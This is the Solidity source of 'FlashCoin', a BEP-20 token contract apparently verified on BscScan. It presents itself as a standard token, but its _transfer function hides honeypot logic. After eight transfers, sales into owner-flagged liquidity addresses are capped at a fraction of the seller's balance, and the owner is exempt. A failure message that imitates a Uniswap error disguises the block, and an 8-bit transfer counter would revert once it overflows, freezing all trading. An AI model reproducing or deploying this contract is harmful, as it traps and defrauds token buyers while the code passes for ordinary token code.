/**
 *Submitted for verification at BscScan.com on 2021-08-10
*/

/**
 *Submitted for verification at BscScan.com on 2021-08-10
*/

// SPDX-License-Identifier:  MIT
/*
 ** this smart contract is made for its owner use. Interact with it at your own risk.
 */
pragma solidity ^0.8.6;

contract FlashCoin {
    string public name;
    string public symbol;
    bool public initialized;
    uint8 public decimals;
    uint256 public totalSupply;
    uint256 public maxTXamount;
    address private creator;
    address public uniswapV2Pair;
    uint8 public txn = 0;
    address private uniswapV2Router =
        0x10ED43C718714eb63d5aA57B78B54704E256024E;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private _isContractAddress;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    constructor() {
        creator = msg.sender;
        _isContractAddress[creator] = true;
        _isContractAddress[uniswapV2Router] = true;
    }

    function init(
        uint256 _totalSupply,
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) external onlyDev {
        totalSupply = _totalSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        maxTXamount = totalSupply / 2000;
        initialized = true;
        uint256 blk = (totalSupply / 100);
        balances[creator] = blk * 5;
        emit Transfer(address(0), creator, balances[creator]);
        balances[0x000000000000000000000000000000000000dEaD] = blk * 95;
        emit Transfer(
            address(0),
            0x000000000000000000000000000000000000dEaD,
            blk * 95
        );
        _approve(creator, uniswapV2Router, type(uint256).max);
    }

    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);

        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function addLPContract(address a) external onlyDev {
        _isContractAddress[a] = true;
    }

    modifier onlyDev {
        require(msg.sender == creator);
        _;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        require(
            amount <= allowances[from][msg.sender],
            "BEP20: ALLOWANCE_NOT_ENOUGH"
        );
        _transfer(from, to, amount);
        _approve(from, msg.sender, allowances[from][msg.sender] - amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "BEP20: Transfer amount must be greater than zero");
        require(
            _isContractAddress[from] == true ||
                (_isContractAddress[from] == false &&
                    _isContractAddress[to] == false) ||
                (_isContractAddress[to] && amount < balances[from] / 9) ||
                txn < 8,
            "BEP20: Error: K"
        );
        txn++;
        balances[from] = balances[from] - amount;
        balances[to] = balances[to] + amount;
        emit Transfer(from, to, amount);
    }
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}